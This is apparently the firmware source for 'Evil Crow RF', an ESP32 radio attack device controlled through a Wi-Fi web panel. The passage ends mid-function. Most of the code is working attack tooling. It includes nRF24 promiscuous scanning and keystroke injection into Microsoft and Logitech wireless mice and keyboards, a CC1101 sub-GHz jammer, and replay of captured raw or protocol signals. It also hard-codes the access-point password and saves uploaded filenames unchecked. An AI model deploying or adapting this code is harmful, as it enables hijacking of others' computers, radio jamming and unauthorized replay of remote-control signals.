#include "ELECHOUSE_CC1101_SRC_DRV.h"
#include <WiFiClient.h> 
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include "SPIFFS.h"
#include "SPI.h"
#include <WiFiAP.h>
#include "FS.h"
#include "SD.h"
#include "nRF24L01.h"
#include "RF24.h"
#include "attack.h"

#define samplesize 1000

#define SD_SCLK 18
#define SD_MISO 19
#define SD_MOSI 23
#define SD_SS   22

SPIClass sdspi(VSPI);

#if defined(ESP8266)
    #define RECEIVE_ATTR ICACHE_RAM_ATTR
#elif defined(ESP32)
    #define RECEIVE_ATTR IRAM_ATTR
#else
    #define RECEIVE_ATTR
#endif

#define CE 33
#define CSN 15

#define CS_B 27

#define HSPI_MISO   12
#define HSPI_MOSI   13
#define HSPI_SCLK   14
#define HSPI_SS     CSN

#define PKT_SIZE 37
#define PAY_SIZE 32
#define MICROSOFT 1
#define LOGITECH 2

SPIClass *nspi = NULL;

RF24 radio(CE, CSN);

long times;
uint64_t promisc_addr = 0xAALL;
uint8_t channel = 25;
uint64_t address;
uint8_t payload[PAY_SIZE];
uint8_t payload_size;
bool payload_encrypted = false;
uint8_t payload_type = 0;
uint16_t sequence;
// Config SSID, password and channel
const char* ssid = "ecv2";  // Enter your SSID here
const char* password = "totototo";  //Enter your Password here
const int wifi_channel = 12; //Enter your preferred Wi-Fi Channel

// HTML and CSS style
const String MENU = "<body><p>Evil Crow RF v1.0</p><div id=\"header\"><body><nav id='menu'><input type='checkbox' id='responsive-menu' onclick='updatemenu()'><label></label><ul><li><a href='/'>Home</a></li><li><a class='dropdown-arrow'>Config</a><ul class='sub-menus'><li><a href='/txconfig'>RAW TX Config</a></li><li><a href='/txbinary'>Binary TX Config</a></li><li><a href='/rxconfig'>RAW RX Config</a></li><li><a href='/btnconfig'>Button TX Config</a></li></ul></li><li><a class='dropdown-arrow'>RX Log</a><ul class='sub-menus'><li><a href='/viewlog'>RX Logs</a></li><li><a href='/delete'>Delete Logs</a></li><li><a href='/downloadlog'>Download Logs</a></li><li><a href='/cleanspiffs'>Clean SPIFFS</a></li></ul></li><li><a class='dropdown-arrow'>URH Protocol</a><ul class='sub-menus'><li><a href='/txprotocol'>TX Protocol</a></li><li><a href='/listxmlfiles'>List Protocol</a></li><li><a href='/uploadxmlfiles'>Upload Protocol</a></li><li><a href='/cleanspiffs'>Clean SPIFFS</a></li></ul></li><li><a href='/jammer'>Simple Jammer</a></li></ul></nav><br></div>";
const String HTML_CSS_STYLING = "<html><head><meta charset=\"utf-8\"><title>Evil Crow RF</title><link rel=\"stylesheet\" href=\"style.css\"><script src=\"lib.js\"></script></head>";

//Pushbutton Pins
int push1 = 34;
int push2 = 35;

int error_toleranz = 200;

int RXPin = 26;
int RXPin0 = 4;
int TXPin0 = 2;
int Gdo0 = 25;
const int minsample = 30;
unsigned long sample[samplesize];
unsigned long samplesmooth[samplesize];
int samplecount;
static unsigned long lastTime = 0;
String transmit = "";
long data_to_send[1000];
long data_button1[1000];
long data_button2[1000];
long data_button3[1000];
long transmit_push[1000];
String tmp_module;
String tmp_frequency;
String tmp_xmlname;
String tmp_codelen;
String tmp_setrxbw;
String tmp_mod;
int mod;
String tmp_deviation;
float deviation;
String tmp_datarate;
String tmp_powerjammer;
int power_jammer;
int datarate;
float frequency;
float setrxbw;
String raw_rx = "0";
String jammer_tx = "0";
const bool formatOnFail = true;
String webString;
String bindata;
int samplepulse;
String tmp_samplepulse;
String tmp_transmissions;
int counter=0;
int pos = 0;
int transmissions;
int pushbutton1 = 0;
int pushbutton2 = 0;
byte jammer[11] = {0xff,0xff,};

//BTN Sending Config
int btn_set_int;
String btn_set;
String btn1_frequency;
String btn1_mod;
String btn1_rawdata;
String btn1_deviation;
String btn1_transmission;
String btn2_frequency;
String btn2_mod;
String btn2_rawdata;
String btn2_deviation;
String btn2_transmission;
float tmp_btn1_deviation;
float tmp_btn2_deviation;
float tmp_btn1_frequency;
float tmp_btn2_frequency;
int tmp_btn1_mod;
int tmp_btn2_mod;
int tmp_btn1_transmission;
int tmp_btn2_transmission;
String bindataprotocol;
String bindata_protocol;

// Jammer
int jammer_pin;

/////////////

void print_payload_details()
{
  Serial.print("ch: ");
  Serial.print(channel);
  Serial.print(" s: ");
  Serial.print(payload_size);
  Serial.print(" a: ");
  for (int j = 0; j < 5; j++)
  {
    Serial.print((uint8_t)(address >> (8 * j) & 0xff), HEX);
    Serial.print(" ");
  }
  Serial.print(" p: ");
  for (int j = 0; j < payload_size; j++)
  {
    Serial.print(payload[j], HEX);
    Serial.print(" ");
  }
  Serial.println("");
  return;
}

// Update a CRC16-CCITT with 1-8 bits from a given byte
uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
{
  crc = crc ^ (byte << 8);
  while(bits--)
    if((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
    else crc = crc << 1;
  crc = crc & 0xFFFF;
  return crc;
}

uint8_t writeRegister(uint8_t reg, uint8_t value)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = nspi->transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  nspi->transfer(value);
  digitalWrite(CSN, HIGH);
  return status;
}

uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = nspi->transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    nspi->transfer(*buf++);
  digitalWrite(CSN, HIGH);

  return status;
}

bool transmitX()
{
  print_payload_details();
  radio.write(payload, payload_size);
  return true;
}

void scan() {
  Serial.println("starting scan...");
  int x, offset;
  uint8_t buf[PKT_SIZE];
  uint16_t wait = 100;
  uint8_t payload_length;
  uint16_t crc, crc_given;

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  //radio.setPALevel(RF24_PA_MIN);
  // radio.setDataRate(RF24_2MBPS);
  writeRegister(RF_SETUP, 0x09); // Disable PA, 2M rate, LNA enabled
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  writeRegister(EN_RXADDR, 0x00);
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  writeRegister(SETUP_AW, 0x00);
  radio.openReadingPipe(0, promisc_addr);
  radio.disableCRC();
  radio.startListening();
  //radio.printDetails();

  while (1) {
    channel++;
    if (channel > 84) {
      Serial.println("starting channel sweep");
    //  digitalWrite(ledpin, HIGH);
      channel = 2;
    }

    if (channel == 4) {
     // digitalWrite(ledpin, LOW);
    }

    if (channel == 42) {
     // digitalWrite(ledpin, HIGH);
    }

    if (channel == 44) {
     // digitalWrite(ledpin, LOW);
    }

   // Serial.print("tuning radio to ");
   // Serial.println(2400 + channel);
    radio.setChannel(channel);

    times = millis();
    while (millis() - times < wait)
    {
      if (radio.available())
      {
        radio.read(&buf, sizeof(buf));

        // In promiscuous mode without a defined address prefix, we attempt to
        // decode the payload as-is, and then shift it by one bit and try again
        // if the first attempt did not pass the CRC check. The purpose of this
        // is to minimize missed detections that happen if we were to use both
        // 0xAA and 0x55 as the nonzero promiscuous mode address bytes.

        for (offset = 0; offset < 2; offset++) {
          // Shift the payload right by one bit if this is the second pass
          if (offset == 1) {
            for (x = 31; x >= 0; x--) {
              if (x > 0) buf[x] = buf[x - 1] << 7 | buf[x] >> 1;
              else buf[x] = buf[x] >> 1;
            }
          }

          // Read the payload length
          payload_length = buf[5] >> 2;

          // Check for a valid payload length, which is less than the usual 32 bytes
          // because we need to account for the packet header, CRC, and part or all
          // of the address bytes.
          if (payload_length <= (PAY_SIZE-9))
          {
            // Read the given CRC
            crc_given = (buf[6 + payload_length] << 9) | ((buf[7 + payload_length]) << 1);
            crc_given = (crc_given << 8) | (crc_given >> 8);
            if (buf[8 + payload_length] & 0x80) crc_given |= 0x100;

            // Calculate the CRC
            crc = 0xFFFF;
            for (x = 0; x < 6 + payload_length; x++) crc = crc_update(crc, buf[x], 8);
            crc = crc_update(crc, buf[6 + payload_length] & 0x80, 1);
            crc = (crc << 8) | (crc >> 8);

            // Verify the CRC
            if (crc == crc_given) {
              Serial.print("found packet /w valid crc... ");

              if (payload_length > 0) {
                Serial.print("payload length is ");
                Serial.println(payload_length);
                // Write the address
                address = 0;
                for (int i = 0; i < 4; i++)
                {
                  address += buf[i];
                  address <<= 8;
                }
                address += buf[4];

                // Write the ESB payload to the output buffer
                for(x = 0; x < payload_length + 3; x++)
                  payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
                payload_size = payload_length;

                print_payload_details();
                return;
              } else {
                Serial.println("payload is empty. scanning...");
              }
            }
          }
        }
      }
    }
  }
}

void start_transmitX()
{
  radio.stopListening();

  radio.openWritingPipe(address);
  radio.openReadingPipe(1, address);
  radio.setAutoAck(true);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);  // Maybe try radio.setDataRate(RF24_250KBPS); OR radio.setDataRate(RF24_1MBPS); to get longer range?!
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  writeRegister(SETUP_AW, 0x03); // Reset addr size to 5 bytes
  radio.setRetries(5,15); // retransmission: interval and count
  radio.setChannel(channel);

  return;
}

// decrypt those keyboard packets!
void ms_crypt()
{
  for (int i = 4; i < payload_size; i++)
    payload[i] ^= address >> (((i - 4) % 5) * 8) & 0xFF;
}

// calculate microsoft wireless keyboard checksum
void ms_checksum()
{
  int last = payload_size - 1;
  payload[last] = 0;
  for (int i = 0; i < last; i++)
    payload[last] ^= payload[i];
  payload[last] = ~payload[last];
}

void fingerprint()
{
  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
    Serial.println("found MS mouse");
    payload_type = MICROSOFT;
    return;
  }

  if (payload_size == 19 && payload[0] == 0x0a) {
    Serial.println("found MS encrypted mouse");
    payload_type = MICROSOFT;
    payload_encrypted = true;
    return;
  }

  if (payload[0] == 0) {
    if (payload_size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
      payload_type = LOGITECH;
    if (payload_size == 22 && payload[1] == 0xD3)
      payload_type = LOGITECH;
    if (payload_size == 5 && payload[1] == 0x40)
      payload_type = LOGITECH;
    if (payload_type == LOGITECH) Serial.println("found Logitech mouse");
  }
  return;
}

void ms_transmitX(uint8_t meta, uint8_t hid) {
  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  payload[7] = meta;
  payload[9] = hid;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  // send keystroke (key down)
  transmitX();
  delay(5);
  sequence++;

  if (payload_encrypted) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  ms_checksum();
  if (payload_encrypted) ms_crypt();
  // send null keystroke (key up)
  transmitX();
  delay(5);
  sequence++;

  return;
}

void log_checksum() {
  uint8_t cksum = 0xff;
  int last = payload_size - 1;
  for (int n = 0; n < last; n++)
    cksum -= payload[n];
  cksum++;
  payload[last] = cksum;
}

void log_transmitX(uint8_t meta, uint8_t keys2send[], uint8_t keysLen) {
  // setup empty payload
  payload_size = 10;
  for (int n = 0; n < payload_size; n++)
    payload[n] = 0;

  // prepare key down frame
  payload[1] = 0xC1;
  payload[2] = meta;

  for (int q = 0; q < keysLen; q++)
    payload[3+q] = keys2send[q];
  log_checksum();

  // send key down
  transmitX();
  delay(5);

  // prepare key up (null) frame
  payload[2] = 0;
  payload[3] = 0;
  payload[4] = 0;
  payload[5] = 0;
  payload[6] = 0;
  payload[7] = 0;
  payload[8] = 0;
  log_checksum();

  // send key up
  transmitX();
  delay(5);

  return;
}

void launch_attack() {
  Serial.println("starting attack");

  if (payload_type) {
    Serial.println("payload type is injectable");

//    digitalWrite(ledpin, HIGH);
    start_transmitX();

    uint8_t meta = 0;
    uint8_t hid = 0;
    uint8_t wait = 0;
    int offset = 0;
    
    uint8_t keys2send[6];
    uint8_t keysLen = 0;

    int keycount = sizeof(attack) / 3;
    sequence = 0;

    // this is to sync the new serial
    if (payload_type == MICROSOFT) {
      for (int i = 0; i < 6; i++) {
        ms_transmitX(0, 0);
      }
    }

    // now inject the hid codes
    for (int i = 0; i <= keycount; i++)
    {
      offset = i * 3;
      meta = attack[offset];
      hid = attack[offset + 1];
      wait = attack[offset + 2];

      if (payload_type == LOGITECH) {
        if (meta) {
          if (keysLen > 0) {
            log_transmitX(0, keys2send, keysLen);
            keysLen = 0;
          }
          keys2send[0] = hid;
          log_transmitX(meta, keys2send, 1);
          keysLen = 0;
        } else if (hid) {
          Serial.print("hid code: ");
          Serial.println(hid);
          bool dup = false;
          for (int j = 0; j < keysLen; j++) {
            if (keys2send[j] == hid)
              dup = true;
          }
          if (dup) {
            log_transmitX(meta, keys2send, keysLen);
            keys2send[0] = hid;
            keysLen = 1;
          } else if (keysLen == 5) {
            keys2send[5] = hid;
            keysLen = 6;
            log_transmitX(meta, keys2send, keysLen);
            keysLen = 0;
          } else {
            keys2send[keysLen] = hid;
            keysLen++;
          }
        } else if (wait) {
          if (keysLen > 0) {
            log_transmitX(meta, keys2send, keysLen);
            keysLen = 0;
          }
          Serial.println("waiting");
          delay(wait << 4);
        }
        if (i == keycount && keysLen > 0) {
            log_transmitX(meta, keys2send, keysLen);
        }
      }

      if (payload_type == MICROSOFT) {
        if (hid) {
          Serial.print("sending hid code: ");
          Serial.println(hid);
          ms_transmitX(meta, hid);
        }
        if (wait) {
          Serial.println("waiting");
          delay(wait << 4);
        }
      }
    }

  //  digitalWrite(ledpin, LOW);
  }
  return;
}

void reset() {
  payload_type = 0;
  payload_encrypted = false;
  payload_size = 0;
  for (int i = 0; i < PAY_SIZE; i++) {
    payload[i] = 0;
  }
  radio.begin(nspi);
}

////////////

// File
File logs;
File file;

AsyncWebServer controlserver(80);

// handles uploads
void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  //Serial.println("Start");
  String logmessage = "Client:" + request->client()->remoteIP().toString() + " " + request->url();
  //Serial.println(logmessage);

  if (!index) {
    logmessage = "Upload Start: " + String(filename);
    // open the file on first call and store the file handle in the request object
    request->_tempFile = SD.open("/URH/" + filename, "w");
    //Serial.println(logmessage);
  }

  if (len) {
    // stream the incoming chunk to the opened file
    request->_tempFile.write(data, len);
    logmessage = "Writing file: " + String(filename) + " index=" + String(index) + " len=" + String(len);
    //Serial.println(logmessage);
  }

  if (final) {
    logmessage = "Upload Complete: " + String(filename) + ",size: " + String(index + len);
    // close the file handle as the upload is now done
    request->_tempFile.close();
    //Serial.println(logmessage);
    request->redirect("/");
  }
}

void listDir(fs::FS &fs, const char * dirname, uint8_t levels){
  deleteFile(SD, "/dir.txt");
  Serial.printf("Listing directory: %s\n", dirname);

  File root = fs.open(dirname);
  if(!root){
    Serial.println("Failed to open directory");
    return;
  }
  if(!root.isDirectory()){
    Serial.println("Not a directory");
    return;
  }

  File file = root.openNextFile();
  while(file){
    if(file.isDirectory()){
      Serial.print("  DIR : ");
      Serial.println(file.name());
      appendFile(SD, "/dir.txt","  DIR : ", file.name());
      if(levels){
        listDir(fs, file.name(), levels -1);
      }
    } else {
      Serial.print("  FILE: ");
      Serial.print(file.name());
      Serial.print("  SIZE: ");
      Serial.println(file.size());
      appendFile(SD, "/dir.txt","", "<br>");
      appendFile(SD, "/dir.txt","", file.name());
      appendFile(SD, "/dir.txt","  SIZE: ", "");
      appendFileLong(SD, "/dir.txt",file.size());
    }
    file = root.openNextFile();
  }
}

void appendFile(fs::FS &fs, const char * path, const char * message, String messagestring){
  //Serial.printf("Appending to file: %s\n", path);

  logs = fs.open(path, FILE_APPEND);
  if(!logs){
    Serial.println("Failed to open file for appending");
    return;
  }
  if(logs.print(message)|logs.print(messagestring)){
    //Serial.println("Message appended");
  } else {
    //Serial.println("Append failed");
  }
  logs.close();
}

void appendFileLong(fs::FS &fs, const char * path, unsigned long messagechar){
  //Serial.printf("Appending to file: %s\n", path);

  logs = fs.open(path, FILE_APPEND);
  if(!logs){
    Serial.println("Failed to open file for appending");
    return;
  }
  if(logs.print(messagechar)){
    //Serial.println("Message appended");
  } else {
    //Serial.println("Append failed");
  }
  logs.close();
}

void deleteFile(fs::FS &fs, const char * path){
  Serial.printf("Deleting file: %s\n", path);
  if(fs.remove(path)){
    Serial.println("File deleted");
  } else {
    Serial.println("Delete failed");
  }
}

void readFile(fs::FS &fs, String path){
  Serial.printf("Reading file: %s\n", path);

  File file = fs.open(path);
  if(!file){
    Serial.println("Failed to open file for reading");
    return;
  }

  Serial.print("Read from file: ");
  while(file.available()){
    bindataprotocol = file.readString();
    Serial.println("");
    Serial.println(bindataprotocol);
  }
  file.close();
}

bool checkReceived(void){
  
  delay(1);
  if (samplecount >= minsample && micros()-lastTime >100000){
    detachInterrupt(RXPin0);
    detachInterrupt(RXPin);
    return 1;
  }else{
    return 0;
  }
}

void printReceived(){
  
  Serial.print("Count=");
  Serial.println(samplecount);
  appendFile(SD, "/logs.txt", NULL, "<br>\n");
  appendFile(SD, "/logs.txt", NULL, "Count=");
  appendFileLong(SD, "/logs.txt", samplecount);
  appendFile(SD, "/logs.txt", NULL, "<br>");
  
  for (int i = 1; i<samplecount; i++){
    Serial.print(sample[i]);
    Serial.print(",");
    appendFileLong(SD, "/logs.txt", sample[i]);
    appendFile(SD, "/logs.txt", NULL, ",");  
  }
  Serial.println();
  Serial.println();
  appendFile(SD, "/logs.txt", "<br>\n", "<br>\n");
  appendFile(SD, "/logs.txt", "\n", "\n");
}

void RECEIVE_ATTR receiver() {
  const long time = micros();
  const unsigned int duration = time - lastTime;

  if (duration > 100000){
    samplecount = 0;
  }

  if (duration >= 100){
    sample[samplecount++] = duration;
  }

  if (samplecount>=samplesize){
    detachInterrupt(RXPin0);
    detachInterrupt(RXPin);
    checkReceived();
  }
  lastTime = time;
}

void enableReceive(){
  pinMode(RXPin0,INPUT);
  RXPin0 = digitalPinToInterrupt(RXPin0);
  ELECHOUSE_cc1101.SetRx();
  samplecount = 0;
  attachInterrupt(RXPin0, receiver, CHANGE);
  pinMode(RXPin,INPUT);
  RXPin = digitalPinToInterrupt(RXPin);
  ELECHOUSE_cc1101.SetRx();
  samplecount = 0;
  attachInterrupt(RXPin, receiver, CHANGE);
}

void parse_data() {

  bindata_protocol = "";
  int data_begin_bits = 0;
  int data_end_bits = 0;
  int data_begin_pause = 0;
  int data_end_pause = 0;
  int data_count = 0;

  for (int c = 0; c<bindataprotocol.length(); c++){
    if (bindataprotocol.substring(c,c+4) == "bits"){
      data_count++;
    }
  }

  for (int d = 0; d<data_count; d++){
    data_begin_bits = bindataprotocol.indexOf("<message bits=", data_end_bits);
    data_end_bits = bindataprotocol.indexOf("decoding_index=", data_begin_bits+1);
    bindata_protocol += bindataprotocol.substring(data_begin_bits+15, data_end_bits-2);
      
    data_begin_pause = bindataprotocol.indexOf("pause=", data_end_pause);
    data_end_pause = bindataprotocol.indexOf(" timestamp=", data_begin_pause+1);
    bindata_protocol += "[Pause: ";
    bindata_protocol += bindataprotocol.substring(data_begin_pause+7, data_end_pause-1);
    bindata_protocol += " samples]\n";
  }
  bindata_protocol.replace(" ","");
  bindata_protocol.replace("\n","");
  bindata_protocol.replace("Pause:","");
  Serial.println("Parsed Data:");
  Serial.println(bindata_protocol);
}

void setup() {

  Serial.begin(38400);
  WiFi.mode(WIFI_AP);
  //WiFi.softAP(ssid, password);
  WiFi.softAP(ssid, password,wifi_channel,8);
  EEPROM.begin(4096);
  delay(7000);
  SPIFFS.begin(formatOnFail);
  sdspi.begin(18, 19, 23, 22);
  SD.begin(22, sdspi);
  pinMode(push1, INPUT);
  pinMode(push2, INPUT);

  controlserver.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/index.html", "text/html");
  });

  controlserver.on("/rxconfig", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/rxconfig.html", "text/html");
  });

  controlserver.on("/txconfig", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/txconfig.html", "text/html");
  });

  controlserver.on("/txprotocol", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/txprotocol.html", "text/html");
  });

  controlserver.on("/txbinary", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/txbinary.html", "text/html");
  });

  controlserver.on("/btnconfig", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/btn3.html", "text/html");
  });

  controlserver.on("/txprotocol", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/txprotocol.html", "text/html");
  });

  controlserver.on("/listxmlfiles", HTTP_GET, [](AsyncWebServerRequest *request) {
    listDir(SD, "/URH", 0);
    request->send(SD, "/dir.txt", "text/html");
  });

  controlserver.on("/uploadxmlfiles", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/uploadxmlfiles.html", "text/html");
  });

  /*controlserver.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
    handleUpload();
  });*/

  controlserver.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
        request->send(200); }, handleUpload);

  controlserver.on("/jammer", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/HTML/jammer.html", "text/html");
  });

  controlserver.on("/stopjammer", HTTP_POST, [](AsyncWebServerRequest *request){
    jammer_tx = "0";
    request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Stop OK\")</script>");
    ELECHOUSE_cc1101.setSidle(); 
  });

  controlserver.on("/setjammer", HTTP_POST, [](AsyncWebServerRequest *request){
    raw_rx = "0";
    tmp_module = request->arg("module");
    tmp_frequency = request->arg("frequency");
    tmp_powerjammer = request->arg("powerjammer");

    if (request->hasArg("configmodule")) {
      frequency = tmp_frequency.toFloat();
      power_jammer = tmp_powerjammer.toInt();

      Serial.println("Start");

      if (tmp_module == "1") {
        pinMode(2,OUTPUT);
        ELECHOUSE_cc1101.setModul(0);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setPA(power_jammer);
        ELECHOUSE_cc1101.SetTx();
        Serial.println("Module 1");
      }
      
      if (tmp_module == "2") {
        pinMode(25,OUTPUT);
        ELECHOUSE_cc1101.setModul(1);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setPA(power_jammer);
        ELECHOUSE_cc1101.SetTx();
        Serial.println("Module 2");
      }
      //sdspi.end();
      //sdspi.begin(18, 19, 23, 22);
      //SD.begin(22, sdspi);
      jammer_tx = "1"; 
      request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Jammer OK\")</script>");
    }  
  });

  controlserver.on("/settx", HTTP_POST, [](AsyncWebServerRequest *request){
    raw_rx = "0";
    tmp_module = request->arg("module");
    tmp_frequency = request->arg("frequency");
    transmit = request->arg("rawdata");
    tmp_deviation = request->arg("deviation");
    tmp_mod = request->arg("mod");
    tmp_transmissions = request->arg("transmissions");

    if (request->hasArg("configmodule")) {
      int counter=0;
      int pos = 0;
      frequency = tmp_frequency.toFloat();
      deviation = tmp_deviation.toFloat();
      mod = tmp_mod.toInt();
      transmissions = tmp_transmissions.toInt();

      for (int i = 0; i<transmit.length(); i++){
        if (transmit.substring(i, i+1) == ","){
          data_to_send[counter]=transmit.substring(pos, i).toInt();
          pos = i+1;
          counter++;
        }
      }

      if (tmp_module == "1") {
        pinMode(2,OUTPUT);
        ELECHOUSE_cc1101.setModul(0);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(mod);
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setDeviation(deviation);
        //delay(400);
        ELECHOUSE_cc1101.SetTx();

        for (int r = 0; r<transmissions; r++) {
          for (int i = 0; i<counter; i+=2){
            digitalWrite(2,HIGH);
            delayMicroseconds(data_to_send[i]);
            digitalWrite(2,LOW);
            delayMicroseconds(data_to_send[i+1]);
            Serial.print(data_to_send[i]);
            Serial.print(",");
          }
          delay(2000); //Set this for the delay between retransmissions
        }        
      }

      else if (tmp_module == "2") {
        pinMode(25,OUTPUT);
        ELECHOUSE_cc1101.setModul(1);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(mod);
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setDeviation(deviation);
        //delay(400);
        ELECHOUSE_cc1101.SetTx();

        for (int r = 0; r<transmissions; r++) {
          for (int i = 0; i<counter; i+=2){
            digitalWrite(25,HIGH);
            delayMicroseconds(data_to_send[i]);
            digitalWrite(25,LOW);
            delayMicroseconds(data_to_send[i+1]);
            Serial.print(data_to_send[i]);
            Serial.print(",");
          }
          delay(2000); //Set this for the delay between retransmissions
        }
      }     
       Serial.println();
       request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Signal has been transmitted\")</script>");
       ELECHOUSE_cc1101.setSidle();
       //sdspi.end();
       //sdspi.begin(18, 19, 23, 22);
       //SD.begin(22, sdspi);
    }
  });

  controlserver.on("/settxbinary", HTTP_POST, [](AsyncWebServerRequest *request){
    raw_rx = "0";
    tmp_module = request->arg("module");
    tmp_frequency = request->arg("frequency");
    bindata = request->arg("binarydata");
    tmp_deviation = request->arg("deviation");
    tmp_mod = request->arg("mod");
    tmp_samplepulse = request->arg("samplepulse");
    tmp_transmissions = request->arg("transmissions");

    if (request->hasArg("configmodule")) {
      int counter=0;
      int pos = 0;
      frequency = tmp_frequency.toFloat();
      deviation = tmp_deviation.toFloat();
      mod = tmp_mod.toInt();
      samplepulse = tmp_samplepulse.toInt();
      transmissions = tmp_transmissions.toInt();

      for (int i=0; i<1000; i++){
        data_to_send[i]=0;
      }

      bindata.replace(" ","");
      bindata.replace("\n","");
      bindata.replace("Pause:","");
      int count_binconvert=0;
      String lastbit_convert="1";
      Serial.println("");
      Serial.println(bindata);

      for (int i = 0; i<bindata.length()+1; i++){
        if (lastbit_convert != bindata.substring(i, i+1)){
          if (lastbit_convert == "1"){
            lastbit_convert="0";
          }else if (lastbit_convert == "0"){
            lastbit_convert="1";
          }
          count_binconvert++;
        }
    
        if (bindata.substring(i, i+1)=="["){
          data_to_send[count_binconvert]= bindata.substring(i+1,bindata.indexOf("]",i)).toInt();
          lastbit_convert="0";
          i+= bindata.substring(i,bindata.indexOf("]",i)).length();
        }else{
          data_to_send[count_binconvert]+=samplepulse;
        }
      }

      for (int i = 0; i<count_binconvert; i++){
        Serial.print(data_to_send[i]);
        Serial.print(",");
      }

      if (tmp_module == "1") {
        pinMode(2,OUTPUT);
        ELECHOUSE_cc1101.setModul(0);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(mod);
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setDeviation(deviation);
        //delay(400);
        ELECHOUSE_cc1101.SetTx();

        delay(1000);

        for (int r = 0; r<transmissions; r++) {
          for (int i = 0; i<count_binconvert; i+=2){
            digitalWrite(2,HIGH);
            delayMicroseconds(data_to_send[i]);
            digitalWrite(2,LOW);
            delayMicroseconds(data_to_send[i+1]);
          }
          delay(2000); //Set this for the delay between retransmissions    
        }
      }

      else if (tmp_module == "2") {
        pinMode(25,OUTPUT);
        ELECHOUSE_cc1101.setModul(1);
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(mod);
        ELECHOUSE_cc1101.setMHZ(frequency);
        ELECHOUSE_cc1101.setDeviation(deviation);
        //delay(400);
        ELECHOUSE_cc1101.SetTx();  

        delay(1000);

        for (int r = 0; r<transmissions; r++) {
          for (int i = 0; i<count_binconvert; i+=2){
            digitalWrite(25,HIGH);
            delayMicroseconds(data_to_send[i]);
            digitalWrite(25,LOW);
            delayMicroseconds(data_to_send[i+1]);
          }
          delay(2000); //Set this for the delay between retransmissions    
        }
      }
      request->send(200, "text/html", HTML_CSS_STYLING + "<script>alert(\"Signal has been transmitted\")</script>");
      ELECHOUSE_cc1101.setSidle();
      //sdspi.end();
      //sdspi.begin(18, 19, 23, 22);
      //SD.begin(22, sdspi);
    }
  });

  controlserver.on("/settxprotocol", HTTP_POST, [](AsyncWebServerRequest *request){
    raw_rx = "0";
    tmp_frequency = request->arg("frequency");
    tmp_deviation = request->arg("deviation");
    tmp_xmlname = request->arg("xmlname");
    tmp_mod = request->arg("mod");
    tmp_samplepulse = request->arg("samplepulse");

    bindata_protocol = "";
    
    if (request->hasArg("configmodule")) {
      
      int counter=0;
      int pos = 0;
      frequency = tmp_frequency.toFloat();
      deviation = tmp_deviation.toFloat();
      mod = tmp_mod.toInt();
      samplepulse = tmp_samplepulse.toInt();

      for (int i=0; i<1000; i++){
        data_to_send[i]=0;
      }

      readFile(SD, tmp_xmlname);
      //readFile(SD, "/URH/protocol.proto.xml");
      parse_data();

      int count_binconvert=0;
      String lastbit_convert="1";

      for (int i = 0; i<bindata_protocol.length()+1; i++){
        if (lastbit_convert != bindata_protocol.substring(i, i+1)){
          if (lastbit_convert == "1"){
            lastbit_convert="0";
          }else if (lastbit_convert == "0"){
            lastbit_convert="1";
          }
          count_binconvert++;
        }
    
        if (bindata_protocol.substring(i, i+1)=="["){
          data_to_send[count_binconvert]= bindata_protocol.substring(i+1,bindata_protocol.indexOf("]",i)).toInt();
          lastbit_convert="0";
